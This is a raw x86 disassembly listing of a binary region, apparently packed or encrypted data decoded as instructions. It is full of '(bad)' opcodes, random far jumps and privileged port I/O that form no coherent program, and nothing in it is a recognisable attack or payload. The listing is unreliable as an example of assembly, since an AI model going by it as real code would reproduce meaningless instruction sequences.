  416e18:	mov    ah,0xb3
  416e1a:	hlt    
  416e1b:	push   eax
  416e1c:	mov    cl,0x1b
  416e1e:	out    dx,al
  416e1f:	push   cs
  416e20:	adc    ebx,DWORD PTR [edi+0x55ef7767]
  416e26:	mov    ebp,ds
  416e28:	out    0x9e,eax
  416e2a:	mov    ebx,0xb608faea
  416e2f:	das    
  416e30:	cmp    eax,0x1db61462
  416e35:	and    al,0x3e
  416e37:	dec    esp
  416e38:	inc    edi
  416e39:	loopne 0x416e15
  416e3b:	push   es
  416e3c:	ins    BYTE PTR es:[edi],dx
  416e3d:	adc    DWORD PTR [eax],esi
  416e3f:	dec    esi
  416e40:	jno    0x416e25
  416e42:	mov    esp,edi
  416e44:	or     BYTE PTR [esi-0x46],ch
  416e47:	mov    DWORD PTR [ebp-0xbedf30c],ecx
  416e4d:	jmp    0x416e1c
  416e4f:	fidivr WORD PTR [esp+0x7f]
  416e53:	sub    BYTE PTR [edx],dl
  416e55:	pop    esi
  416e56:	xchg   DWORD PTR [ebp+0x59],ebx
  416e59:	out    0x1,al
  416e5b:	xor    ah,BYTE PTR [esi]
  416e5d:	sbb    al,0x8f
  416e5f:	lods   al,BYTE PTR ds:[esi]
  416e60:	jg     0x416e41
  416e62:	and    al,0x8e
  416e64:	ins    DWORD PTR es:[edi],dx
  416e65:	scas   al,BYTE PTR es:[edi]
  416e66:	out    0xa2,eax
  416e68:	xor    DWORD PTR [ebp-0x4c905b51],edx
  416e6e:	jb     0x416eb8
  416e70:	cdq    
  416e71:	mov    ebp,0x4671961e
  416e76:	stc    
  416e77:	mov    ah,0xf0
  416e79:	js     0x416e1c
  416e7b:	push   0xffffff9f
  416e7d:	push   edx
  416e7e:	imul   edi,DWORD PTR [edx+0x17f0a380],0x18
  416e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e86:	cmp    al,0x7b
  416e88:	mov    BYTE PTR ds:[ecx],dl
  416e8b:	rol    BYTE PTR [ebx+0x7671a92e],0xaa
  416e92:	mov    ch,0xea
  416e94:	test   BYTE PTR [esi],bl
  416e96:	nop
  416e97:	int3   
  416e98:	push   eax
  416e99:	lods   eax,DWORD PTR ds:[esi]
  416e9a:	retf   0xdc80
  416e9d:	ins    BYTE PTR es:[edi],dx
  416e9e:	in     eax,dx
  416e9f:	jp     0x416ea8
  416ea1:	push   edi
  416ea2:	jbe    0x416ef5
  416ea4:	lahf   
  416ea5:	ror    edx,cl
  416ea7:	fild   DWORD PTR [esp+ecx*4]
  416eaa:	cmp    eax,0x13fcbfb4
  416eaf:	xor    eax,0x3230cab7
  416eb4:	sub    esp,esp
  416eb6:	or     ebx,DWORD PTR [ebp-0x1f]
  416eb9:	and    eax,0xb22910ed
  416ebe:	stos   DWORD PTR es:[edi],eax
  416ebf:	es inc edi
  416ec1:	pop    ss
  416ec2:	fst    st(0)
  416ec4:	mov    ds:0x2e87a659,eax
  416ec9:	mov    al,0x3a
  416ecb:	icebp  
  416ecc:	xor    eax,0xe293a414
  416ed1:	fwait
  416ed2:	and    esi,DWORD PTR [edi]
  416ed4:	out    0x3c,al
  416ed6:	jmp    0xa39efcc2
  416edb:	push   esp
  416edc:	mov    esi,0x139fea88
  416ee1:	sbb    ch,BYTE PTR [esi+esi*4+0xfb34b2]
  416ee8:	and    al,0xfe
  416eea:	in     al,0xb1
  416eec:	mov    edi,0xafd07724
  416ef1:	mov    bl,0xb0
  416ef3:	cs xor ch,ah
  416ef6:	add    edi,DWORD PTR [esi+eax*2+0x6a3b005a]
  416efd:	push   ss
  416efe:	or     eax,0x8efe7652
  416f03:	add    BYTE PTR [ecx+0x76],cl
  416f06:	fwait
  416f07:	retf   
  416f08:	mov    ecx,0xde50689
  416f0d:	push   0xa199fb09
  416f12:	cs int3 
  416f14:	cmp    edi,eax
  416f16:	int    0x58
  416f18:	out    0x98,al
  416f1a:	xor    eax,0x64667a90
  416f1f:	xchg   DWORD PTR [edx-0x32],ebx
  416f22:	aam    0xbd
  416f24:	xchg   ebx,eax
  416f25:	push   edi
  416f26:	loopne 0x416f1a
  416f28:	adc    eax,0x15642812
  416f2d:	pop    ebp
  416f2e:	hlt    
  416f2f:	mov    bh,0xa1
  416f31:	fadd   st(0),st
  416f33:	inc    esp
  416f34:	pop    es
  416f35:	bound  eax,QWORD PTR [ebx+0xb]
  416f38:	jbe    0x416f0e
  416f3a:	aad    0x75
  416f3c:	ret    
  416f3d:	int3   
  416f3e:	mov    bh,0xec
  416f40:	sub    ah,BYTE PTR [esi-0x41a8d62e]
  416f46:	xor    BYTE PTR [ecx+ecx*4],bh
  416f49:	jne    0x416efa
  416f4b:	out    0x34,eax
  416f4d:	aas    
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	mov    ebx,0x379ffc1e
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0xd770707e
  416f77:	cli    
  416f78:	loop   0x416fc2
  416f7a:	add    DWORD PTR [esi],esi
  416f7c:	sti    
  416f7d:	mov    ecx,0xe031acf1
  416f82:	xor    edi,ebp
  416f84:	pop    es
  416f85:	pop    edi
  416f86:	adc    DWORD PTR [eax+0x21db88f8],0x684d3b74
  416f90:	(bad)  
  416f91:	fidiv  DWORD PTR [ecx]
  416f93:	fistp  WORD PTR [esi]
  416f95:	scas   al,BYTE PTR es:[edi]
  416f96:	ja     0x416f96
  416f98:	(bad)  
  416f99:	xchg   ecx,eax
  416f9a:	jg     0x416fa6
  416f9c:	xor    DWORD PTR [ebx+0x5f1fadbd],edx
  416fa2:	pop    ecx
  416fa3:	push   ebx
  416fa4:	fisub  WORD PTR [ecx]
  416fa6:	int3   
  416fa7:	jne    0x417024
  416fa9:	inc    eax
  416faa:	push   ds
  416fab:	cmp    DWORD PTR [ecx+0x65],eax
  416fae:	lock int3 
  416fb0:	push   ebp
  416fb1:	pop    ebp
  416fb2:	or     DWORD PTR ds:[eax+0x68bfdf2f],esi
  416fb9:	dec    eax
  416fba:	or     BYTE PTR [ebx-0x161b10f4],ch
  416fc0:	(bad)  
  416fc2:	pop    ebp
  416fc3:	das    
  416fc4:	fiadd  WORD PTR ds:0x26ad6613
  416fca:	lods   al,BYTE PTR ds:[esi]
  416fcb:	jnp    0x416fc1
  416fcd:	xor    dl,0x67
  416fd0:	fxch   st(6)
  416fd2:	stos   DWORD PTR es:[edi],eax
  416fd3:	shl    bh,0xa2
  416fd6:	jo     0x417005
  416fd8:	inc    edi
  416fd9:	ret    0x5eb9
  416fdc:	jl     0x417000
  416fde:	ja     0x417045
  416fe0:	sbb    al,0x9c
  416fe2:	mov    eax,ds:0x1ed173f3
  416fe7:	in     al,dx
  416fe8:	mov    WORD PTR [esi+0x18],cs
  416feb:	and    DWORD PTR [ebx],ebx
  416fed:	iret   
  416fee:	jno    0x417037
  416ff0:	push   cs
  416ff1:	cwde   
  416ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ff3:	sbb    bl,dl
  416ff5:	sub    eax,0x172b9aa1
  416ffa:	sub    ah,0xfa
  416ffd:	shl    bh,0xdb
  417000:	arpl   WORD PTR [ebx-0x4d447bd5],di
  417006:	in     eax,0x91
  417008:	leave  
  417009:	repz out dx,eax
  41700b:	and    DWORD PTR [esi],eax
  41700d:	retf   0x6dec
  417010:	add    ebx,ebp
  417012:	scas   eax,DWORD PTR es:[edi]
  417013:	xchg   ecx,eax
  417014:	popa   
  417015:	mov    cl,0xc0
  417017:	mov    cl,0x95
  417019:	aad    0xd5
  41701b:	mov    esp,0x14aca97d
  417020:	popf   
  417021:	dec    ebx
  417022:	out    dx,eax
  417023:	(bad)  
  417025:	xor    al,0x78
  417027:	test   DWORD PTR [eax-0x33],ecx
  41702a:	mov    bl,0x7c
  41702c:	pop    edx
  41702d:	xchg   esi,eax
  41702e:	scas   eax,DWORD PTR es:[edi]
  41702f:	ins    BYTE PTR es:[edi],dx
  417030:	pop    edi
  417031:	push   ss
  417032:	cmp    al,0x6a
  417034:	aam    0x2f
  417036:	test   DWORD PTR [edi+0x30],edi
  417039:	xchg   ebx,eax
  41703a:	inc    ebp
  41703b:	jns    0x416fdf
  41703d:	test   DWORD PTR [ecx],ecx
  41703f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417040:	gs popf 
  417042:	inc    edx
  417043:	jecxz  0x417083
  417045:	mov    WORD PTR [ebx],si
  417048:	fst    st(0)
  41704a:	lods   al,BYTE PTR ds:[esi]
  41704b:	test   eax,0xf0fdf209
  417050:	xlat   BYTE PTR ds:[ebx]
  417051:	aas    
  417052:	xchg   ebx,eax
  417053:	add    al,0xc2
  417055:	inc    edx
  417056:	inc    ebx
  417057:	jp     0x41704f
  417059:	test   BYTE PTR [edi-0x652a3594],ch
  41705f:	or     BYTE PTR [esi+0x51252289],cl
  417065:	jmp    0x6896a109
  41706a:	push   0x200aa8a3
  41706f:	lock mov ds:0xf0941160,al
  417075:	lock jecxz 0x4170d0
  417078:	jge    0x417089
  41707a:	repz push edi
  41707c:	mov    ebp,0x4a62b76b
  417081:	xor    ebx,edx
  417083:	idiv   bh
  417085:	(bad)  
  417086:	jo     0x417042
  417088:	inc    edx
  417089:	mov    dl,0x71
  41708b:	push   eax
  41708c:	sbb    eax,0x230facf4
  417091:	les    esp,FWORD PTR [edi]
  417093:	bound  edi,QWORD PTR [esi+0x47]
  417096:	pushf  
  417097:	int3   
  417098:	icebp  
  417099:	mov    ebx,0xb76f7c7c
  41709e:	popa   
  41709f:	imul   edx,DWORD PTR [edx],0xffffffe3
  4170a2:	jge    0x417094
  4170a4:	jl     0x41710b
  4170a6:	outs   dx,BYTE PTR ds:[esi]
  4170a7:	mov    ebx,0xe0313088
  4170ac:	not    DWORD PTR [ecx-0x4800d45b]
  4170b2:	aas    
  4170b3:	lds    eax,FWORD PTR [ebp-0x6a3d6a5]
  4170b9:	mov    edx,DWORD PTR [ecx]
  4170bb:	shl    BYTE PTR [edi+ebx*4+0x232f64c9],cl
  4170c2:	push   es
  4170c3:	mov    edi,0x979e790f
  4170c8:	push   ecx
  4170c9:	xor    BYTE PTR [ecx+0x678dcff2],ah
  4170cf:	shl    BYTE PTR [ebp+0x48d34f83],0x15
  4170d6:	scas   al,BYTE PTR es:[edi]
  4170d7:	popf   
  4170d8:	jno    0x4170ba
  4170da:	out    0xb8,eax
  4170dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170dd:	lds    edx,FWORD PTR [ebx-0x79]
  4170e0:	sbb    DWORD PTR ds:[ebp+0x47],edx
  4170e4:	cmp    dh,BYTE PTR [edx]
  4170e6:	mov    bh,0xbe
  4170e8:	outs   dx,DWORD PTR ds:[esi]
  4170e9:	push   cs
  4170ea:	cmc    
  4170eb:	push   ecx
  4170ec:	adc    cl,ah
  4170ee:	fsubr  QWORD PTR [eax-0x19]
  4170f1:	cld    
  4170f2:	add    al,0xef
  4170f4:	imul   ebp,DWORD PTR [ebx-0x522a03db],0xfffffffa
  4170fb:	aas    
  4170fc:	mov    ds:0xa342b24f,al
  417101:	scas   eax,DWORD PTR es:[edi]
  417102:	stos   BYTE PTR es:[edi],al
  417103:	xor    al,0xcd
  417106:	scas   al,BYTE PTR es:[edi]
  417107:	stos   DWORD PTR es:[edi],eax
  417108:	jb     0xd2ede823
  41710e:	out    dx,eax
  41710f:	jmp    0x8ad72495
  417114:	jns    0x41718b
  417116:	push   0x2e
  417118:	aam    0x67
  41711a:	bound  ecx,QWORD PTR [edx]
  41711c:	jbe    0x417146
  41711e:	sar    DWORD PTR [edi-0x706ec812],0xe2
  417125:	ss and al,0x27
  417128:	int3   
  417129:	enter  0x6688,0x51
  41712d:	or     al,0xc6
  41712f:	sbb    al,0x82
  417131:	mov    ecx,0x467cc057
  417136:	inc    edx
  417137:	or     ah,BYTE PTR [ebp+0x22]
  41713a:	js     0x41712e
  41713c:	push   eax
  41713d:	std    
  41713e:	or     esi,DWORD PTR [ecx]
  417140:	into   
  417141:	shl    ch,1
  417143:	popf   
  417144:	pop    ebp
  417145:	inc    ecx
  417146:	stc    
  417147:	mov    bl,0xc9
  417149:	mov    bl,0xcc
  41714b:	sbb    DWORD PTR [esi+0x71d3396b],eax
  417151:	xchg   edi,eax
  417152:	push   fs
  417154:	call   0x8ce5:0x52a68aea
  41715b:	or     cl,bh
  41715d:	or     dl,BYTE PTR [edx+0x4ad0294f]
  417163:	jl     0x417112
  417165:	xor    bh,dl
  417167:	sbb    edi,DWORD PTR [ecx+0x6304faad]
  41716d:	adc    DWORD PTR [ebp-0xde174ea],ebp
  417173:	jp     0x41713f
  417175:	jecxz  0x41715a
  417177:	sbb    BYTE PTR [eax-0x7a24ed],cl
  41717d:	into   
  41717e:	pop    esp
  41717f:	jno    0x417171
  417181:	popa   
  417182:	jo     0x4171bc
  417184:	into   
  417185:	iret   
  417186:	add    BYTE PTR [ebx+0x30],ch
  417189:	sbb    bl,BYTE PTR [eax+edi*2]
  41718c:	(bad)  
  41718d:	mov    ah,bl
  41718f:	xchg   ecx,eax
  417190:	test   DWORD PTR [edi+0xbed59c0],0x1b7a6fec
  41719a:	mov    ds:0x18325b29,eax
  41719f:	scas   eax,DWORD PTR es:[edi]
  4171a0:	or     eax,0x14100114
  4171a5:	enter  0x35e2,0x57
  4171a9:	out    dx,al
  4171aa:	sahf   
  4171ab:	sbb    edi,ebx
  4171ad:	push   0xbd0a5c06
  4171b2:	nop
  4171b3:	add    eax,0x34701714
  4171b8:	enter  0x728e,0xb3
  4171bc:	sbb    DWORD PTR [edx],edx
  4171be:	push   ds
  4171bf:	aad    0xcf
  4171c1:	ss aam 0xb9
  4171c4:	test   al,0xfe
  4171c6:	jmp    0x4171c6
  4171c8:	rcl    ah,1
  4171ca:	sti    
  4171cb:	cli    
  4171cc:	or     DWORD PTR cs:0xfb17d343,eax
  4171d3:	mov    al,ds:0x5d6915b2
  4171d8:	push   esp
  4171d9:	lods   eax,DWORD PTR ds:[esi]
  4171da:	push   ds
  4171db:	mov    dh,0xa2
  4171dd:	xchg   DWORD PTR [ecx+0x73],esi
  4171e0:	pop    es
  4171e1:	pop    edx
  4171e2:	in     al,0x5a
  4171e4:	ror    BYTE PTR [edx+0x3197d55d],0x1e
  4171eb:	and    al,0xe9
  4171ed:	and    dh,dh
  4171ef:	mov    esi,0xd5df6457
  4171f4:	pop    es
  4171f5:	jmp    0xfe53:0xc4758994
  4171fc:	push   es
  4171fd:	into   
  4171fe:	fild   WORD PTR [edx+0x29268792]
  417204:	mov    WORD PTR [esi],ds
  417206:	sub    ah,BYTE PTR [edi+esi*8-0x3b]
  41720a:	push   0x9a079068
  41720f:	ret    0xe6a9
  417212:	add    eax,DWORD PTR [esp+edi*4+0x637ff833]
  417219:	dec    ebx
  41721a:	clc    
  41721b:	jno    0x417269
  41721d:	sbb    BYTE PTR [eax],ch
  41721f:	jl     0x417236
  417221:	fcom   DWORD PTR [edx]
  417223:	int3   
  417224:	pop    esp
  417225:	inc    esp
  417226:	stos   BYTE PTR es:[edi],al
  417227:	jg     0x4171c1
  417229:	dec    esi
  41722a:	or     BYTE PTR [ecx],cl
  41722c:	xchg   esi,eax
  41722d:	dec    esp
  41722e:	mov    ds:0xfcdd2aa2,al
  417233:	aad    0xf
  417235:	lds    eax,FWORD PTR [eax]
  417237:	pop    ss
  417238:	scas   eax,DWORD PTR es:[edi]
  417239:	inc    esi
  41723a:	cld    
  41723b:	pop    esi
  41723c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41723d:	dec    edx
  41723e:	inc    ebx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	dec    edi
  417255:	mov    ebp,0x2670d398
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0xc870707e
  417261:	and    bl,BYTE PTR [ebx+0xc]
  417264:	outs   dx,BYTE PTR ds:[esi]
  417265:	mov    bh,0xd6
  417267:	adc    dl,BYTE PTR [edx+ebp*2]
  41726a:	fimul  WORD PTR [ecx+0x90a9d17]
  417270:	retf   
  417271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417272:	int    0x67
  417274:	retf   0x6efa
  417277:	cmp    BYTE PTR [ebx+0x1],dh
  41727a:	push   es
  41727b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41727c:	push   0xffffffae
  41727e:	icebp  
  41727f:	sbb    DWORD PTR [edi+0x4300ce97],0xffffff9c
  417286:	or     DWORD PTR [eax+0x7f],ecx
  417289:	mov    esp,DWORD PTR [edx]
  41728b:	jb     0x41728c
  41728d:	clc    
  41728e:	lods   eax,DWORD PTR ds:[esi]
  41728f:	xor    esi,DWORD PTR [ebx-0x60]
  417292:	jae    0x417286
  417294:	add    al,0x10
  417296:	jne    0x417246
  417298:	dec    bx
  41729a:	sahf   
  41729b:	(bad)  
  41729c:	mov    DWORD PTR [edi-0x1542d7b4],edx
  4172a2:	xchg   edx,eax
  4172a3:	jge    0x4172b9
  4172a5:	xor    BYTE PTR [ebx-0x38bfbf7d],dl
  4172ab:	mov    ah,0x38
  4172ad:	and    DWORD PTR [eax-0x49d5d3bd],ebx
  4172b3:	aas    
  4172b4:	mov    cl,0xad
  4172b6:	fmul   st(2),st
  4172b8:	xor    BYTE PTR [edi],0x35
  4172bb:	jmp    DWORD PTR [esp+edi*1]
  4172be:	push   ebp
  4172bf:	push   ebp
  4172c0:	jecxz  0x4172e7
  4172c2:	lea    ebp,[ebx-0x7992cd38]
  4172c8:	mov    ah,0x94
  4172ca:	sub    esi,edx
  4172cc:	inc    ecx
  4172cd:	push   0x1af90bcd
  4172d2:	dec    ebx
  4172d3:	in     eax,dx
  4172d4:	mov    cl,0xca
  4172d6:	xor    edi,DWORD PTR [edx+ecx*2]
  4172d9:	icebp  
  4172da:	sbb    al,0xe
  4172dc:	or     BYTE PTR [ecx+0x30],ch
  4172df:	mov    DWORD PTR [edx+0x44],esp
  4172e2:	or     BYTE PTR [edx+0x513316cc],bl
  4172e8:	(bad)  
  4172e9:	and    ebx,ecx
  4172eb:	test   al,0xb6
  4172ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ee:	dec    edx
  4172ef:	ds adc ecx,0xffffffbb
  4172f3:	repz sub eax,0x64b6302c
  4172f9:	xlat   BYTE PTR ds:[ebx]
  4172fa:	fsubr  QWORD PTR [edi+eiz*4-0x6664d370]
  417301:	inc    edi
  417302:	mov    ds:0xef1757d0,al
  417307:	or     BYTE PTR [edx+0x69],dh
  41730a:	sub    dh,BYTE PTR [esi+0x6ac01b61]
  417310:	rcr    dl,1
  417312:	mov    edi,0x61942d41
  417317:	lahf   
  417318:	jo     0x41736f
  41731a:	or     edx,DWORD PTR [eax+0x19b49329]
  417320:	aas    
  417321:	and    DWORD PTR [edi-0x3dd3e950],edi
  417327:	xchg   al,dl
  417329:	fst    DWORD PTR [eax-0x5c]
  41732c:	retf   
  41732d:	lea    edx,[esi]
  41732f:	les    esp,FWORD PTR [edi]
  417331:	repnz arpl WORD PTR [esi+0x6f],bp
  417335:	in     eax,0x5c
  417337:	jns    0x4172e7
  417339:	cmp    eax,0x5e225e8a
  41733e:	jle    0x4173ae
  417340:	mov    ah,0xf7
  417342:	adc    eax,0x17c0a33d
  417347:	(bad)  
  417348:	retf   
  417349:	mov    edx,0xb185e99f
  41734e:	test   eax,0x8e625184
  417353:	push   edi
  417354:	jae    0x4173bb
  417356:	add    dh,BYTE PTR [edi]
  417358:	xor    DWORD PTR [ecx-0x4a1eb02d],edx
  41735e:	cmp    DWORD PTR ds:0x3c6fd373,0x5d0a1525
  417368:	cdq    
  417369:	mov    ds:0xf64d0895,eax
  41736e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41736f:	cmp    eax,0x8ff09e26
  417374:	sub    dl,BYTE PTR [ecx-0x56697006]
  41737a:	mov    al,ds:0x69306f4c
  41737f:	iret   
  417380:	ret    0xc12e
  417383:	out    0x8f,al
  417385:	into   
  417386:	lods   al,BYTE PTR ds:[esi]
  417387:	adc    DWORD PTR [esi-0x4688e8f0],0x8156baac
  417391:	fmul   DWORD PTR [ebx-0xeddac0b]
  417397:	ins    BYTE PTR es:[edi],dx
  417398:	std    
  417399:	add    bh,cl
  41739b:	push   ebp
  41739c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41739d:	mov    ?,WORD PTR ds:0xb36848dd
  4173a3:	push   ds
  4173a4:	out    0xac,eax
  4173a6:	adc    al,cl
  4173a8:	fdivr  DWORD PTR [ebp+0x44]
  4173ab:	dec    ebx
  4173ac:	leave  
  4173ad:	xor    ebp,ecx
  4173af:	sbb    esi,esp
  4173b1:	(bad)  
  4173b2:	stos   BYTE PTR es:[edi],al
  4173b3:	jmp    0x417373
  4173b5:	retw   
  4173b7:	cmc    
  4173b8:	jno    0x4173a8
  4173ba:	lods   eax,DWORD PTR ds:[esi]
  4173bb:	les    eax,FWORD PTR [edx-0x7c7176eb]
  4173c1:	pop    ecx
  4173c2:	in     eax,dx
  4173c3:	mov    al,al
  4173c5:	imul   edx,DWORD PTR [eax+0x1cfc1dfb],0xffffffd3
  4173cc:	adc    eax,0x3b3dd35c
  4173d1:	stc    
  4173d2:	loop   0x41737e
  4173d4:	sbb    ebx,DWORD PTR [ecx]
  4173d6:	jb     0x4173a3
  4173d8:	lods   al,BYTE PTR ds:[esi]
  4173d9:	and    esp,esi
  4173db:	outs   dx,BYTE PTR ds:[esi]
  4173dc:	clc    
  4173dd:	fidiv  WORD PTR [edi+0x32086837]
  4173e3:	inc    esp
  4173e4:	pop    ecx
  4173e5:	push   0x43e07933
  4173ea:	nop
  4173eb:	in     al,dx
  4173ec:	test   eax,0xb841622b
  4173f1:	sub    BYTE PTR [eax],0x95
  4173f4:	loope  0x4173d0
  4173f6:	mov    cl,0x39
  4173f8:	cwde   
  4173f9:	jp     0x41739c
  4173fb:	push   ebx
  4173fc:	push   ebp
  4173fd:	out    dx,al
  4173fe:	add    ebp,DWORD PTR [ebp-0x16]
  417401:	out    dx,al
  417402:	int3   
  417403:	cdq    
  417404:	and    eax,0x7187997c
  417409:	out    0x69,eax
  41740b:	test   DWORD PTR [esi+0x68],0x38df8ec0
  417412:	add    eax,0x30
  417415:	daa    
  417416:	push   edx
  417417:	aaa    
  417418:	mov    bh,0xaf
  41741a:	(bad)  
  41741b:	shl    BYTE PTR [edi+ebx*4-0x18bb64e4],cl
  417422:	retf   
  417423:	mov    al,0x24
  417425:	add    edx,ebp
  417427:	dec    ecx
  417428:	sub    BYTE PTR [eax+0x3f],ah
  41742b:	je     0x417455
  41742d:	cmp    dl,BYTE PTR [esi-0x569d477f]
  417433:	call   0xc2ed:0xd4b6dd4f
  41743a:	lea    ecx,[edi]
  41743c:	xchg   BYTE PTR [ebx],bh
  41743e:	cmp    DWORD PTR [ebx],0xffffffdf
  417441:	xor    eax,edx
  417443:	pop    edx
  417444:	inc    edi
  417445:	fdiv   DWORD PTR [esi+0x79]
  417448:	in     al,0xdd
  41744a:	iret   
  41744b:	les    edx,FWORD PTR [eax]
  41744d:	add    DWORD PTR [edi],ebx
  41744f:	in     eax,0x25
  417451:	pop    ss
  417452:	sti    
  417453:	add    cl,ch
  417455:	mov    DWORD PTR [esi+0x44ee957b],edx
  41745b:	fld    TBYTE PTR [esi-0x58]
  41745e:	adc    esi,DWORD PTR [ecx]
  417460:	pusha  
  417461:	push   edi
  417462:	cli    
  417463:	std    
  417464:	push   eax
  417465:	adc    al,0x6a
  417467:	jnp    0x4174c8
  417469:	imul   ebp,DWORD PTR [ecx+0x7a376553],0x481f3e85
  417473:	pop    edi
  417474:	mov    cl,0x95
  417476:	scas   eax,DWORD PTR es:[edi]
  417477:	imul   esi,ebp,0xffffffd6
  41747a:	xchg   esi,eax
  41747b:	inc    esp
  41747c:	cmp    BYTE PTR [edi-0x52],0xfa
  417480:	and    eax,0x84a17e0
  417485:	mov    dh,0xf
  417487:	xchg   edi,eax
  417488:	xchg   esp,eax
  417489:	inc    esi
  41748a:	adc    bh,BYTE PTR [ecx-0x42]
  41748d:	add    esp,edi
  41748f:	in     al,dx
  417490:	loopne 0x4174cc
  417492:	and    eax,0x4883db5c
  417497:	dec    ecx
  417498:	xchg   esp,eax
  417499:	cli    
  41749a:	jb     0x417482
  41749c:	ja     0x417518
  41749e:	adc    BYTE PTR [ecx+0x1299c0a8],0xc0
  4174a5:	sbb    al,dl
  4174a7:	inc    eax
  4174a8:	add    BYTE PTR [edi+0x41059202],cl
  4174ae:	adc    al,0xaf
  4174b0:	dec    edx
  4174b1:	hlt    
  4174b2:	adc    edx,DWORD PTR [ebx]
  4174b4:	imul   ebp,DWORD PTR [ecx],0xcbff0705
  4174ba:	push   ds
  4174bb:	sbb    BYTE PTR [eax+eax*8+0x76176678],ah
  4174c2:	dec    ebp
  4174c3:	add    edx,DWORD PTR [eax]
  4174c5:	dec    esp
  4174c6:	loop   0x417533
  4174c8:	xchg   edi,eax
  4174c9:	cli    
  4174ca:	aaa    
  4174cb:	fstp   DWORD PTR [ebp+0x1d9e437f]
  4174d1:	ret    0xeb51
  4174d4:	and    esp,edi
  4174d6:	dec    ebx
  4174d7:	jl     0x4174f1
  4174d9:	mov    esp,0x4e384ad8
  4174de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174df:	loope  0x41748a
  4174e1:	cmp    BYTE PTR [ebx],al
  4174e3:	push   es
  4174e4:	mov    ch,BYTE PTR [edx]
  4174e6:	cld    
  4174e7:	mov    edi,0x1a02301e
  4174ec:	lods   al,BYTE PTR ds:[esi]
  4174ed:	or     DWORD PTR [ebx-0x347ffc42],edx
  4174f3:	push   edi
  4174f4:	jae    0x4174cd
  4174f6:	ins    BYTE PTR es:[edi],dx
  4174f7:	xchg   DWORD PTR [edx+0xc46b805],esi
  4174fd:	xor    eax,0x933bc9e1
  417502:	dec    esp
  417503:	dec    ebp
  417504:	test   eax,0xe9cc1eb6
  417509:	pop    eax
  41750a:	xor    eax,0x769be850
  41750f:	pop    esp
  417510:	fisub  DWORD PTR [ebx-0x56bbc1f9]
  417516:	in     al,0xec
  417518:	mov    ebx,ss
  41751a:	and    ecx,esp
  41751c:	lds    ebx,FWORD PTR [esp+esi*4+0x6d18f744]
  417523:	fistp  DWORD PTR [edi+ebx*1+0x1d23361]
  41752a:	pop    ebp
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    edx,eax
  417543:	mov    eax,0x24b92056
  417548:	jg     0x4175ba
  41754a:	mov    ecx,0x3370707e
  41754f:	fiadd  DWORD PTR [esi-0x7f]
  417552:	jbe    0x4175ad
  417554:	cld    
  417555:	xchg   bh,cl
  417557:	mov    edi,0xe3edfee3
  41755c:	add    eax,0x80a43d65
  417561:	and    dh,BYTE PTR [ecx]
  417563:	or     BYTE PTR ds:0xcf0f720e,ah
  417569:	pushf  
  41756a:	dec    edx
  41756b:	arpl   WORD PTR [eax],si
  41756d:	lea    esp,[edi-0x136128bf]
  417573:	fwait
  417574:	nop
  417575:	sbb    esi,DWORD PTR [ecx-0x79]
  417578:	adc    DWORD PTR [esi],edi
  41757a:	and    eax,0x7fd180b4
  41757f:	sub    DWORD PTR [ebp+0x742d4c4b],ecx
  417585:	pushf  
  417586:	test   dh,ah
  417588:	pop    esi
  417589:	fild   WORD PTR [edi+0x4d]
  41758c:	(bad)  
  41758d:	dec    ecx
  41758e:	and    al,0xd5
  417590:	call   0xccc9:0x93029f55
  417597:	cmp    BYTE PTR [edi+0x39],ch
  41759a:	test   DWORD PTR [ebp+0x79f4901],ebx
  4175a0:	mov    ds:0x8de22062,al
  4175a5:	cld    
  4175a6:	add    al,0xbd
  4175a8:	addr16 pop ebx
  4175aa:	adc    DWORD PTR [edi+0x6a],ebp
  4175ad:	mov    ecx,0x51898d56
  4175b2:	push   cs
  4175b3:	ret    
  4175b4:	call   0xbc11a68
  4175b9:	push   edi
  4175ba:	sbb    dh,ah
  4175bc:	out    dx,al
  4175bd:	dec    edi
  4175be:	stos   DWORD PTR es:[edi],eax
  4175bf:	ins    BYTE PTR es:[edi],dx
  4175c0:	fldcw  WORD PTR [edx-0x65]
  4175c3:	fstp   TBYTE PTR [ecx-0x5a]
  4175c6:	clc    
  4175c7:	cs jmp 0x4175f5
  4175ca:	out    dx,eax
  4175cb:	popf   
  4175cc:	or     ch,BYTE PTR [ebx+0x63e2bf92]
  4175d2:	mov    al,ds:0xadef0b0f
  4175d7:	jmp    0x7a20:0x3a6bcfb1
  4175de:	or     BYTE PTR [edi-0x41],dl
  4175e1:	push   esi
  4175e2:	ins    DWORD PTR es:[edi],dx
  4175e3:	rol    eax,1
  4175e5:	pop    edx
  4175e6:	and    ch,BYTE PTR [edx-0x69]
  4175e9:	or     BYTE PTR [edi],0x34
